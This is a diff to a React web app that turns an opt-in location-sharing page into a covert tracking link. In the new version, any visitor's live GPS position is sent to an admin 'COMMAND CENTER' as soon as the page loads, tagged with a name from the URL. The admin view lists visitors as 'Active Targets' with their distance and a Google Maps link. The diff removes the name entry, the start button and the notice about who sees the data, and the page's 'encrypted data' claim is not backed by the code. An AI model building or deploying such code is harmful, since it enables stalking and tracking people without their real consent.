@@ -1,16 +1,29 @@
 import React, { useEffect, useState } from 'react';
 import { MapContainer, TileLayer, Marker, Popup, useMap } from 'react-leaflet';
 import { io } from 'socket.io-client';
-import { User, Navigation, ShieldCheck, Share2 } from 'lucide-react';
+import { User, Navigation, ShieldCheck, Map as MapIcon, ExternalLink, LocateFixed } from 'lucide-react';
 import 'leaflet/dist/leaflet.css';
-
-// Fix for Leaflet Icons
 import L from 'leaflet';
+
+// Fix Leaflet Icons
 import markerIcon from 'leaflet/dist/images/marker-icon.png';
 import markerShadow from 'leaflet/dist/images/marker-shadow.png';
-L.Marker.prototype.options.icon = L.icon({ iconUrl: markerIcon, shadowUrl: markerShadow, iconSize: [25, 41], iconAnchor: [12, 41] });
+const DefaultIcon = L.icon({ iconUrl: markerIcon, shadowUrl: markerShadow, iconSize: [25, 41], iconAnchor: [12, 41] });
+L.Marker.prototype.options.icon = DefaultIcon;
 
 const socket = io(window.location.hostname === 'localhost' ? 'http://localhost:3000' : '/');
+
+// Helper to calculate distance in KM
+const getDistance = (lat1, lon1, lat2, lon2) => {
+  const R = 6371; // Radius of earth in km
+  const dLat = (lat2 - lat1) * Math.PI / 180;
+  const dLon = (lon2 - lon1) * Math.PI / 180;
+  const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
+            Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+            Math.sin(dLon / 2) * Math.sin(dLon / 2);
+  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+  return (R * c).toFixed(2);
+};
 
 function RecenterMap({ coords }) {
   const map = useMap();
@@ -19,72 +32,106 @@ function RecenterMap({ coords }) {
 }
 
 export default function App() {
-  const [role, setRole] = useState('user'); // 'user' or 'admin'
-  const [userName, setUserName] = useState(localStorage.getItem('userName') || '');
-  const [userId] = useState(localStorage.getItem('userId') || 'user_' + Math.random().toString(36).substr(2, 9));
-  const [isSharing, setIsSharing] = useState(false);
+  const [role, setRole] = useState('user');
+  const [adminLocation, setAdminLocation] = useState(null);
   const [users, setUsers] = useState([]);
   const [selectedUser, setSelectedUser] = useState(null);
 
+  // Automatic Setup on Load
   useEffect(() => {
-    // Save userId to prevent data loss on refresh
+    const params = new URLSearchParams(window.location.search);
+    const urlName = params.get('name') || `User_${Math.random().toString(36).substr(2, 5)}`;
+    const userId = localStorage.getItem('userId') || 'uid_' + Math.random().toString(36).substr(2, 9);
     localStorage.setItem('userId', userId);
-    
-    // Check if URL contains "/admin"
+
     if (window.location.pathname.includes('/admin')) {
       setRole('admin');
+      // Admin also tracks their own location to calculate distance
+      navigator.geolocation.getCurrentPosition((pos) => {
+        setAdminLocation({ lat: pos.coords.latitude, lng: pos.coords.longitude });
+      });
+    } else {
+      // USER SIDE: Start tracking automatically immediately
+      const startAutoTracking = () => {
+        navigator.geolocation.watchPosition((pos) => {
+          socket.emit('update-location', { 
+            userId, 
+            name: urlName, 
+            lat: pos.coords.latitude, 
+            lng: pos.coords.longitude 
+          });
+        }, (err) => console.error("Location Error:", err), { 
+          enableHighAccuracy: true,
+          maximumAge: 0,
+          timeout: 5000 
+        });
+      };
+      startAutoTracking();
     }
 
     socket.on('users-list', (data) => setUsers(data));
     return () => socket.off('users-list');
-  }, [userId]);
+  }, []);
 
-  const startSharing = () => {
-    if (!userName) return alert("Please enter your name");
-    localStorage.setItem('userName', userName);
-    setIsSharing(true);
-    
-    navigator.geolocation.watchPosition((pos) => {
-      socket.emit('update-location', { 
-        userId, 
-        name: userName, 
-        lat: pos.coords.latitude, 
-        lng: pos.coords.longitude 
-      });
-    }, (err) => console.error(err), { enableHighAccuracy: true });
+  const openInGoogleMaps = (lat, lng) => {
+    window.open(`https://www.google.com/maps?q=${lat},${lng}`, '_blank');
   };
 
   // --- ADMIN VIEW ---
   if (role === 'admin') {
     return (
-      <div className="flex h-screen w-full bg-slate-900 text-white">
-        <div className="w-80 bg-slate-800 border-r border-slate-700 p-4 flex flex-col z-[1000]">
-          <h1 className="text-xl font-bold flex items-center gap-2 mb-6">
-            <ShieldCheck className="text-red-400" /> Admin Portal
-          </h1>
-          <div className="flex-1 overflow-y-auto">
-            <p className="text-xs uppercase text-slate-500 font-bold mb-4">Live Tracking ({users.length})</p>
-            {users.map(u => (
-              <div 
-                key={u.userId} 
-                onClick={() => setSelectedUser(u)}
-                className={`p-3 rounded-lg mb-2 cursor-pointer flex items-center gap-3 transition ${selectedUser?.userId === u.userId ? 'bg-blue-600' : 'bg-slate-700 hover:bg-slate-600'}`}
-              >
-                <div className="bg-slate-800 p-2 rounded-full"><User size={16}/></div>
-                <div>
-                  <p className="font-medium text-sm">{u.name}</p>
-                  <p className="text-[10px] opacity-60">ID: {u.userId}</p>
+      <div className="flex h-screen w-full bg-slate-950 text-white font-sans">
+        <div className="w-80 bg-slate-900 border-r border-slate-800 p-4 flex flex-col z-[1000] shadow-2xl">
+          <div className="flex items-center gap-2 mb-8 p-2 bg-red-500/10 rounded-lg border border-red-500/20">
+            <ShieldCheck className="text-red-500" />
+            <h1 className="text-lg font-bold tracking-tight">COMMAND CENTER</h1>
+          </div>
+          
+          <div className="flex-1 overflow-y-auto custom-scrollbar">
+            <p className="text-[10px] uppercase text-slate-500 font-black mb-4 tracking-widest">Active Targets</p>
+            {users.map(u => {
+              const distance = adminLocation ? getDistance(adminLocation.lat, adminLocation.lng, u.lat, u.lng) : '...';
+              return (
+                <div 
+                  key={u.userId} 
+                  onClick={() => setSelectedUser(u)}
+                  className={`p-4 rounded-xl mb-3 cursor-pointer transition-all border ${selectedUser?.userId === u.userId ? 'bg-blue-600 border-blue-400 shadow-lg scale-[1.02]' : 'bg-slate-800 border-slate-700 hover:bg-slate-750'}`}
+                >
+                  <div className="flex justify-between items-start mb-2">
+                    <span className="font-bold text-sm">{u.name}</span>
+                    <span className="text-[10px] bg-black/30 px-2 py-1 rounded text-blue-300 font-mono">{distance} km</span>
+                  </div>
+                  <div className="flex gap-2">
+                    <button 
+                      onClick={(e) => { e.stopPropagation(); openInGoogleMaps(u.lat, u.lng); }}
+                      className="flex-1 bg-white/10 hover:bg-white/20 p-2 rounded text-[10px] flex items-center justify-center gap-1"
+                    >
+                      <MapIcon size={12}/> Google Maps
+                    </button>
+                  </div>
                 </div>
-              </div>
-            ))}
+              );
+            })}
           </div>
         </div>
-        <div className="flex-1">
+
+        <div className="flex-1 relative">
           <MapContainer center={[20.5937, 78.9629]} zoom={5} className="h-full w-full">
-            <TileLayer url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png" />
+            <TileLayer url="https://{s}.tile.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png" />
             {users.map(u => (
               <Marker key={u.userId} position={[u.lat, u.lng]}>
-                <Popup className="text-black"><b>{u.name}</b><br/>User is active</Popup>
+                <Popup className="custom-popup">
+                  <div className="p-2 text-slate-900">
+                    <h3 className="font-bold border-b mb-2">{u.name}</h3>
+                    <p className="text-xs mb-2">Lat: {u.lat.toFixed(4)} <br/> Lng: {u.lng.toFixed(4)}</p>
+                    <button 
+                      onClick={() => openInGoogleMaps(u.lat, u.lng)}
+                      className="w-full bg-blue-600 text-white p-2 rounded text-xs flex items-center justify-center gap-1"
+                    >
+                      <ExternalLink size={12}/> Open in Maps
+                    </button>
+                  </div>
+                </Popup>
               </Marker>
             ))}
             {selectedUser && <RecenterMap coords={selectedUser} />}
@@ -94,43 +141,19 @@ export default function App() {
     );
   }
 
-  // --- USER VIEW (ONLY SHARING) ---
+  // --- USER VIEW (ZERO UI MODE) ---
   return (
-    <div className="h-screen w-full bg-slate-900 flex items-center justify-center p-6">
-      <div className="max-w-md w-full bg-slate-800 rounded-2xl p-8 shadow-2xl border border-slate-700 text-center">
-        <div className="bg-blue-500/10 w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-6">
-          <Navigation className="text-blue-500 w-10 h-10" />
+    <div className="h-screen w-full bg-slate-950 flex flex-col items-center justify-center p-10 text-center">
+        <div className="relative">
+            <div className="absolute inset-0 bg-blue-500 blur-3xl opacity-20 animate-pulse"></div>
+            <LocateFixed className="w-16 h-16 text-blue-500 mb-6 relative animate-bounce" />
         </div>
-        <h1 className="text-2xl font-bold text-white mb-2">Location Sharer</h1>
-        <p className="text-slate-400 mb-8 text-sm">Your location will only be visible to the system administrator.</p>
-
-        {!isSharing ? (
-          <div className="space-y-4">
-            <input 
-              className="w-full p-4 rounded-xl bg-slate-900 border border-slate-700 text-white outline-none focus:border-blue-500 transition"
-              placeholder="Enter your full name"
-              value={userName}
-              onChange={(e) => setUserName(e.target.value)}
-            />
-            <button 
-              onClick={startSharing}
-              className="w-full bg-blue-600 hover:bg-blue-500 text-white p-4 rounded-xl font-bold flex items-center justify-center gap-2 transition transform active:scale-95"
-            >
-              <Share2 size={20} /> Start Live Sharing
-            </button>
-          </div>
-        ) : (
-          <div className="py-6 px-4 bg-green-500/10 border border-green-500/20 rounded-xl">
-            <div className="animate-pulse flex items-center justify-center gap-2 text-green-400 font-bold mb-1">
-              <div className="w-2 h-2 bg-green-400 rounded-full"></div>
-              LIVE SHARING ACTIVE
-            </div>
-            <p className="text-xs text-green-500/60 uppercase">Sharing as {userName}</p>
-          </div>
-        )}
-        
-        <p className="mt-8 text-[10px] text-slate-600 uppercase tracking-widest">Secure Emergency Tracking System</p>
-      </div>
+        <h2 className="text-xl font-bold text-white mb-2">Secure Link Active</h2>
+        <p className="text-slate-500 text-sm max-w-xs">Your live location is being securely shared with the emergency dashboard.</p>
+        <div className="mt-10 flex items-center gap-2 text-[10px] text-blue-400 font-mono tracking-tighter">
+            <span className="w-2 h-2 bg-blue-500 rounded-full animate-ping"></span>
+            TRANSMITTING ENCRYPTED DATA...
+        </div>
     </div>
   );
 }
